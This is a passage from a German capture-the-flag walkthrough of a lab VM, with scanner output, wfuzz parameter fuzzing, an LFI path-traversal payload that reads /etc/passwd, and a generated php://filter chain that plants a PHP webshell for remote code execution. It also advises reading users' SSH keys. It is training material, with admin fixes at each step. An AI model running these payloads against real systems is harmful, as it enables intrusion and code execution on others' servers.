+                *   `-r`: Rekursive Suche (folgt Verzeichnissen).
+                *   `-e php,txt,.git`: Sucht speziell nach diesen Erweiterungen zusätzlich zu den Standard-Erweiterungen.
+                Die Ausgabe zeigt viele Versuche, auf versteckte Konfigurationsdateien wie `.htaccess` oder `.htpasswd` zuzugreifen, die alle mit 403 (Forbidden) beantwortet werden. Dies ist normales Verhalten, wenn der Server so konfiguriert ist, dass der Zugriff auf Punkt-Dateien verboten ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `dirsearch` findet ebenfalls `/robots.txt` (Status 200) und `/server-status` (Status 403). Die vielen 403-Fehler für Punkt-Dateien zeigen, dass der Server grundlegend gegen den Zugriff auf diese geschützt ist. Die rekursive Suche (`-r`) scheint hier keine neuen, tieferen Verzeichnisse aufgedeckt zu haben, außer dem Versuch, `/server-status/` zu scannen. Der Hinweis auf `login VM: 4ng0l4 hacker schreibweise = angola` ist eine externe Notiz und kein Tool-Output; sie deutet auf einen möglichen Benutzernamen oder Hinweis hin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Behalte den Hinweis `4ng0l4` / `angola` im Hinterkopf, möglicherweise ist dies ein Benutzername für SSH oder eine andere Anwendung. Konzentriere dich auf die Analyse der `/robots.txt`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass der Zugriff auf Konfigurationsdateien (Punkt-Dateien) wie `.htaccess` serverseitig blockiert ist (Standard bei Apache). Überprüfen Sie Berechtigungen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">dirsearch -u http://192.168.2.165 -r -e php,txt,.git</span>
+                    </div>
+                    <pre>
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, txt, git | HTTP method: GET | Threads: 25 | Wordlist size: 10454
+
+utput File: /root/reports/http_192.168.2.165/_25-01-28_22-19-29.txt
+
+Target: http://192.168.2.165/
+
+[22:19:29] Starting:
+[22:19:30] 403 -  278B  - /.ht_wsr.txt
+[22:19:30] 403 -  278B  - /.htaccess.bak1
+[22:19:30] 403 -  278B  - /.htaccess.orig
+[22:19:30] 403 -  278B  - /.htaccess.sample
+[22:19:30] 403 -  278B  - /.htaccess_orig
+[22:19:30] 403 -  278B  - /.htaccess_extra
+[22:19:30] 403 -  278B  - /.htaccess.save
+[22:19:30] 403 -  278B  - /.htaccessLD2
+[22:19:30] 403 -  278B  - /.htaccessLD
+[22:19:30] 403 -  278B  - /.htaccessBAK
+[22:19:30] 403 -  278B  - /.htm
+[22:19:30] 403 -  278B  - /.htaccess_sc
+[22:19:30] 403 -  278B  - /.html
+[22:19:30] 403 -  278B  - /.htpasswd_test
+[22:19:30] 403 -  278B  - /.httr-oauth
+[22:19:30] 403 -  278B  - /.htpasswds
+[22:19:31] 403 -  278B  - /.php
+[22:19:53] 200 -  755B  - /robots.txt  <- Inhalt von robots.txt wurde offenbar nicht ausgegeben, nur der Dateiname
+[22:19:54] 403 -  278B  - /server-status/
+Added to the queue: server-status/
+[22:19:54] 403 -  278B  - /server-status
+
+[22:20:02] Starting: server-status/
+[22:20:02] 404 -  275B  - /server-status/%2e%2e//google.com
+
+Task Completed
+
+login VM: 4ng0l4
+hacker schreibweise = angola
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein weiterer `gobuster`-Scan wird gestartet, diesmal mit einer benutzerdefinierten Wortliste namens `1337_format.txt`. Diese Liste enthält wahrscheinlich Wörter in Leetspeak oder anderen "Hacker"-Formaten. Die übrigen Parameter sind ähnlich wie beim vorherigen `gobuster`-Scan.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Scan mit der speziellen Wortliste ist erfolgreich und findet ein verstecktes Verzeichnis: `/n3gr4/` (Status 301 - Moved Permanently, was auf `http://192.168.2.165/n3gr4/` weiterleitet). Der Name `n3gr4` (Negra) ist in Leetspeak und passt zum Thema der Maschine (Angola, Palanca Negra). Dies ist ein **sehr wichtiger Fund**, da er auf eine nicht standardmäßige Anwendung oder einen versteckten Bereich hindeutet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche das Verzeichnis `/n3gr4/` sofort. Führe weitere Scans (gobuster, dirb, etc.) gezielt auf dieses Verzeichnis durch, um Dateien oder weitere Unterverzeichnisse darin zu finden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Vermeiden Sie es, Verzeichnisse durch "Security through Obscurity" (Verstecken durch ungewöhnliche Namen) zu schützen. Implementieren Sie stattdessen ordnungsgemäße Zugriffskontrollen (Authentifizierung, Autorisierung). Überwachen Sie den Webserver auf Zugriffe auf unerwartete Pfade.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.165" -w 1337_format.txt -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml -b '503,404,403' -e --no-error -k</span>
+                    </div>
+                    <pre>
+http://192.168.2.165/n3gr4                (Status: 301) [Size: 314] [--> http://192.168.2.165/n3gr4/]
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der `gobuster`-Scan wird nun gezielt auf das neu entdeckte Verzeichnis `/n3gr4/` ausgeführt, wieder mit der benutzerdefinierten Wortliste `1337_format.txt`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Volltreffer! Der Scan findet eine PHP-Datei: `m414nj3.php` (Status 500 - Internal Server Error). Der Name `m414nj3` (Malanje) passt wieder zum Angola-Thema. Ein Status 500 deutet auf einen Fehler bei der Ausführung des Skripts hin, was oft passiert, wenn Parameter fehlen oder ungültig sind. Die Existenz dieser Datei ist der Schlüssel zum nächsten Schritt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die `m414nj3.php` direkt. Versuche, sie mit verschiedenen Parametern aufzurufen. Fuzzing der Parameter (wie im nächsten Schritt) ist eine gute Idee. Analysiere den Quellcode, falls möglich (z.B. über LFI).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Analysieren Sie den Quellcode von `m414nj3.php` auf Sicherheitslücken. Stellen Sie sicher, dass Fehlermeldungen keine sensiblen Informationen preisgeben (Status 500 sollte generisch sein). Implementieren Sie Eingabevalidierung und Fehlerbehandlung.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.165/n3gr4" -w 1337_format.txt -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml -b '503,404,403' -e --no-error -k</span>
+                    </div>
+                    <pre>
+http://192.168.2.165/n3gr4/m414nj3.php          (Status: 500) [Size: 0]
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="vulnerability-scanning">
+             <h2>Vulnerability Scanning</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ein `nmap`-Scan mit dem Skript-Argument `vuln` wird durchgeführt. Dieses Argument ist eine Kategorie, die alle Skripte in der `vuln`-Kategorie ausführt, um bekannte Schwachstellen in den erkannten Diensten zu finden.
+                *   `-sV -A`: Versionserkennung und aggressive Optionen (werden hier wiederholt, `-A` beinhaltet `-sV`).
+                *   `--script vuln`: Führt Schwachstellen-Scan-Skripte aus.
+                *   `192.168.2.165` (im Text steht `192.168.2.144`, aber das scheint ein Tippfehler zu sein, da der Rest des Outputs zur `.165` passt): Ziel-IP.
+                *   `-T5`: Sehr schnelles Timing.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan liefert umfangreiche Ergebnisse, insbesondere für den SSH-Dienst (OpenSSH 9.2p1):
+                *   **SSH (`vulners` Skript):** Listet eine große Anzahl potenzieller CVEs (Common Vulnerabilities and Exposures) und Exploits auf, die mit OpenSSH 9.2p1 in Verbindung gebracht werden. Darunter sind hoch bewertete CVEs wie CVE-2023-38408 (RCE über eingeschleuste Bibliotheken in `ssh-agent`) und CVE-2023-28531 (RCE in `ssh-add`). Es werden auch viele Links zu `githubexploit` angezeigt, die auf Proof-of-Concept-Code hindeuten könnten. Es ist wichtig zu beachten, dass die reine Versionsnummer nicht immer bedeutet, dass eine Schwachstelle ausnutzbar ist (Backporting von Patches in Debian).
+                *   **HTTP:** Keine spezifischen Schwachstellen wie CSRF, DOM-basiertes XSS oder Stored XSS gefunden. `/robots.txt` wird erneut als existierend gemeldet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Recherchiere die gemeldeten CVEs für OpenSSH 9.2p1 genauer, insbesondere CVE-2023-38408 und CVE-2023-28531. Prüfe, ob die spezifischen Bedingungen für eine Ausnutzung auf dem Zielsystem gegeben sind und ob öffentliche Exploits verfügbar und anwendbar sind. Dies könnte ein alternativer Weg zum Initial Access sein.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie dringend, ob die installierte OpenSSH-Version (9.2p1 auf Debian 12) tatsächlich anfällig für die gemeldeten CVEs ist oder ob Sicherheitspatches durch Debian bereits angewendet wurden (`apt list --upgradable`). Aktualisieren Sie das System und insbesondere OpenSSH auf die neuesten verfügbaren Versionen. Konfigurieren Sie SSH sicher (siehe frühere Empfehlungen).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sV -A --script vuln 192.168.2.165 -T5</span> <!-- Annahme: IP korrigiert von .144 auf .165 -->
+                    </div>
+                    <pre>
+:::::::::::::::::::::::: Nmap Schwachstellenscan Scan ::::::::::::::::::::::
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 21:29 CET
+Pre-scan script results:
+| broadcast-avahi-dos:
+|   Discovered hosts:
+|     224.0.0.251
+|   After NULL UDP avahi packet DoS (CVE-2011-1002).
+|_  Hosts are all up (not vulnerable).
+Nmap scan report for plpl.hmv (192.168.2.165)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PRT   STATE SERVICE VERSIN
+22/tcp open  ssh     penSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| vulners:
+|   cpe:/a:openbsd:openssh:9.2p1:
+|     	95499236-C9FE-56A6-9D7D-E943A24B633A	10.0	https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A	*EXPLIT*
+|     	2C119FFA-ECE0-5E14-A4A4-354A2C38071A	10.0	https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A	*EXPLIT*
+|     	CVE-2023-38408	9.8	https://vulners.com/cve/CVE-2023-38408
+|     	CVE-2023-28531	9.8	https://vulners.com/cve/CVE-2023-28531
+|     	B8190CDB-3EB9-5631-9828-8064A1575B23	9.8	https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23	*EXPLIT*
+|     	8FC9C5AB-3968-5F3C-825E-E8DB5379A623	9.8	https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623	*EXPLIT*
+|     	8AD01159-548E-546E-AA87-2DE89F3927EC	9.8	https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC	*EXPLIT*
+|     	887EB570-27D3-11EE-ADBA-C80AA9043978	9.8	https://vulners.com/freebsd/887EB570-27D3-11EE-ADBA-C80AA9043978
+|
+|     	123C2683-74BE-5320-AA3A-C376C8E3A992	8.1	https://vulners.com/githubexploit/123C2683-74BE-5320-AA3A-C376C8E3A992	*EXPLIT*
+|     	11F020AC-F907-5606-8805-0516E06160EE	8.1	https://vulners.com/githubexploit/11F020AC-F907-5606-8805-0516E06160EE	*EXPLIT*
+|     	108E1D25-1F7E-534C-97CD-3F6045E32B98	8.1	https://vulners.com/githubexploit/108E1D25-1F7E-534C-97CD-3F6045E32B98	*EXPLIT*
+|     	0FC4BE81-312B-51F4-9D9B-66D8B5C093CD	8.1	https://vulners.com/githubexploit/0FC4BE81-312B-51F4-9D9B-66D8B5C093CD	*EXPLIT*
+|     	0F9B3655-C7D4-55A9-8EB5-2EAD9CEAB180	8.1	https://vulners.com/githubexploit/0F9B3655-C7D4-55A9-8EB5-2EAD9CEAB180	*EXPLIT*
+|     	0E9294FD-6B44-503A-84C2-C6E76E53B0B7	8.1	https://vulners.com/githubexploit/0E9294FD-6B44-503A-84C2-C6E76E53B0B7	*EXPLIT*
+|     	0A8CA57C-ED38-5301-A03A-C841BD3082EC	8.1	https://vulners.com/githubexploit/0A8CA57C-ED38-5301-A03A-C841BD3082EC	*EXPLIT*
+|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLIT*
+|     	PACKETSTRM:173661	7.5	https://vulners.com/packetstorm/PACKETSTRM:173661	*EXPLIT*
+|     	F0979183-AE88-53B4-86CF-3AF0523F3807	7.5	https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807	*EXPLIT*
+|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLIT*
+|     	CVE-2023-51385	6.5	https://vulners.com/cve/CVE-2023-51385
+|     	CVE-2023-48795	5.9	https://vulners.com/cve/CVE-2023-48795
+|     	54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C	5.9	https://vulners.com/githubexploit/54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C	*EXPLIT*
+|     	CVE-2023-51384	5.5	https://vulners.com/cve/CVE-2023-51384
+|     	PACKETSTRM:140261	0.0	https://vulners.com/packetstorm/PACKETSTRM:140261	*EXPLIT*
+|     	5C971D4B-2DD3-5894-9EC2-DAB952B4740D	0.0	https://vulners.com/githubexploit/5C971D4B-2DD3-5894-9EC2-DAB952B4740D	*EXPLIT*
+|_    	39E70D1A-F5D8-59D5-A0CF-E73D9BAA3118	0.0	https://vulners.com/githubexploit/39E70D1A-F5D8-59D5-A0CF-E73D9BAA3118	*EXPLIT*
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-dombased-xss: Couldn't find any DM based XSS.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-enum:
+|_  /robots.txt: Robots file
+MAC Address: 08:00:27:6A:2F:23 (racle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+S CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+S details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: S: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACERUTE
+HP RTT     ADDRESS
+1   0.12 ms plpl.hmv (192.168.2.165)
+
+S and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 67.82 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (LFI to RCE)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `wfuzz` wird verwendet, um Parameter für das Skript `m414nj3.php` zu fuzzen. Es wird versucht herauszufinden, welcher Parameter verwendet wird, um eine Local File Inclusion (LFI) auszulösen, die bereits im Payload (`../../.../etc/passwd`) angedeutet wird.
+                *   `-c`: Farbige Ausgabe.
+                *   `-w ...directory-list-2.3-medium.txt`: Wortliste für Parameternamen.
+                *   `-u "http://.../m414nj3.php?FUZZ=../../.../etc/passwd"`: Die URL, wobei `FUZZ` durch die Wörter aus der Liste ersetzt wird. Der Wert des Parameters ist bereits auf einen LFI-Payload gesetzt.
+                *   `--hc 404`: Versteckt Antworten mit Statuscode 404 (Not Found).
+                *   `--hh 0`: Versteckt Antworten mit 0 Zeichen (Chars) im Body. Ziel ist es, eine Antwort zu finden, die nicht 404 ist und Inhalt hat.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Fuzzing-Versuch ist erfolgreich! Es wird der Parameter `page` identifiziert. Wenn `page` mit dem LFI-Payload gesetzt wird, antwortet der Server mit Status 200 und liefert Inhalt (1066 Chars), was darauf hindeutet, dass der Inhalt von `/etc/passwd` erfolgreich eingebunden und angezeigt wurde. Dies bestätigt eine kritische LFI-Schwachstelle im Parameter `page` des Skripts `m414nj3.php`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die LFI-Schwachstelle, um weitere sensible Dateien zu lesen (z.B. Konfigurationsdateien, SSH-Keys, Quellcode des PHP-Skripts selbst). Versuche, die LFI zu Remote Code Execution (RCE) zu eskalieren, z.B. durch Einbinden von Log-Dateien (Log Poisoning) oder durch Nutzung von PHP-Wrappern wie `php://filter` oder `php://input`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Beheben Sie die LFI-Schwachstelle dringend!** Implementieren Sie eine Whitelist für erlaubte Dateinamen im `include()`-Aufruf. Sanitisieren Sie den `page`-Parameter rigoros, um Directory Traversal (`../`) zu verhindern. Deaktivieren Sie `allow_url_include` in der `php.ini`.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.2.165/n3gr4/m414nj3.php?FUZZ=../../../../../../../../../../../../../../../../etc/passwd" --hc 404 --hh 0</span>
+                     </div>
+                     <pre>
+ ********************************************************
+ * Wfuzz 3.1.0 - The Web Fuzzer                         *
+ ********************************************************
+
+ Target: http://192.168.2.165/n3gr4/m414nj3.php?FUZZ=../../../../../../../../../../../../../../../../etc/passwd
+ Total requests: 471
+
+ =====================================================================
+ ID           Response   Lines    Word       Chars       Payload
+ =====================================================================
+
+ 000000103:   <span style="color:lime;">200</span>        22 L     26 W       1066 Ch     "page"
+
+ Total time: 0.726065s
+ Processed Requests: 471
+ Filtered Requests: 470
+ Requests/sec.: 648.6861
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der `curl`-Befehl wird verwendet, um die bestätigte LFI-Schwachstelle auszunutzen und den Inhalt der Datei `/etc/passwd` vom Server abzurufen. `-s` unterdrückt die Statusausgabe von curl. Das Ergebnis wird mit `grep sh` gefiltert, um Zeilen zu finden, die Benutzern mit einer Login-Shell (`/bin/bash` oder ähnliches) entsprechen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Befehl ist erfolgreich und zeigt Teile der `/etc/passwd`-Datei an. Wichtig sind die Einträge für `root` (`/bin/bash`) und einen normalen Benutzer `p4l4nc4` (UID 1000, `/bin/bash`). Der Benutzer `p4l4nc4` (Palanca) passt wieder zum Thema und ist ein vielversprechendes Ziel für den nächsten Schritt. Der Benutzer `sshd` hat `/usr/sbin/nologin`, was normal ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche, weitere Dateien zu lesen, die für den Benutzer `p4l4nc4` relevant sein könnten, insbesondere SSH-Keys im Verzeichnis `/home/p4l4nc4/.ssh/id_rsa`. Nutze die LFI, um den Quellcode von `m414nj3.php` selbst zu lesen (`...php?page=m414nj3.php`), um die Schwachstelle besser zu verstehen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle. Überprüfen Sie die Berechtigungen für sensible Dateien wie `/etc/passwd`, um sicherzustellen, dass sie nicht unnötig lesbar sind (obwohl Lesbarkeit für `/etc/passwd` normal ist).
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">curl -s http://192.168.2.165/n3gr4/m414nj3.php?page=../../../../../../../../../../../../../../../../etc/passwd | grep sh</span>
+                     </div>
+                     <pre>
+ root:x:0:0:root:/root:/bin/bash
+ sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+ p4l4nc4:x:1000:1000:p4l4nc4,,,:/home/p4l4nc4:/bin/bash
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird in ein lokales Verzeichnis gewechselt, das ein Tool namens `php_filter_chain_generator.py` enthält. Dieses Skript wird verwendet, um komplexe PHP-Filterketten zu generieren. Solche Ketten können genutzt werden, um über eine LFI-Schwachstelle (insbesondere mit `include()` oder `require()`) PHP-Code auszuführen, selbst wenn `allow_url_include` deaktiviert ist. Das Ziel ist es, den PHP-Code `<?php system($GET["cmd"]); ?>` (eine einfache Webshell) auf dem Server zu erzeugen und auszuführen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Skript generiert erfolgreich eine sehr lange und komplexe `php://filter`-Kette. Diese Kette nutzt eine Kombination aus Zeichenkodierungs-Konvertierungen (`convert.iconv.*`) und Base64-Kodierung/-Dekodierung (`convert.base64-encode`, `convert.base64-decode`), um den Ziel-PHP-Code zu erzeugen. Am Ende wird `/resource=php://temp` angehängt, was oft verwendet wird, um den resultierenden Code zur Ausführung zu bringen. Dies ist eine fortgeschrittene Technik zur Eskalation von LFI zu RCE.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Kopiere die generierte Filterkette und füge sie als Wert für den `page`-Parameter in die URL ein. Füge am Ende `&cmd=befehl` hinzu, um die eingebettete Webshell zu nutzen (z.B. `&cmd=id`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die beste Verteidigung ist die Behebung der LFI-Schwachstelle. Zusätzlich kann das Deaktivieren nicht benötigter PHP-Filter (`php.ini` oder Serverkonfiguration) die Ausnutzung erschweren, ist aber keine vollständige Lösung. Web Application Firewalls (WAFs) können bekannte Filterketten blockieren, aber Angreifer können oft neue Varianten finden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">cd Hackingtools/php_filter_chain_generator</span>
+                    </div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">ll</span>
+                    </div>
+                    <pre>
+insgesamt 32
+-rwxr-xr-x 1 root root  8765 24. Aug 00:11 php_filter_chain_generator.py
+-rw-r--r-- 1 root root   209 27. Sep 00:52 pythonshell.txt
+-rw-r--r-- 1 root root 12534 24. Aug 00:11 README.md
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">./php_filter_chain_generator.py --chain '&lt;?php system($GET["cmd"]); ?&gt;'</span> <!-- Maskierung: < > -->
+                    </div>
+                    <pre>
+[+] The following gadget chain will generate the following code : &lt;?php system($GET["cmd"]); ?&gt; (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+)
+php://filter/convert.iconv.UTF8.CSIS2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDWS-1258.UTF32LE|convert.iconv.ISIRI3342.IS-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IS2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.IS88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.IS-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICDE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.IS8859-9.IS_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICDE|convert.iconv.CP1282.IS-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICDE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.SF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICDE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSIS2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSIS2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.IS6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICDE|convert.iconv.CP1282.IS-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.IS6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICDE|convert.iconv.CP1282.IS-IR-90|convert.iconv.IS6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIF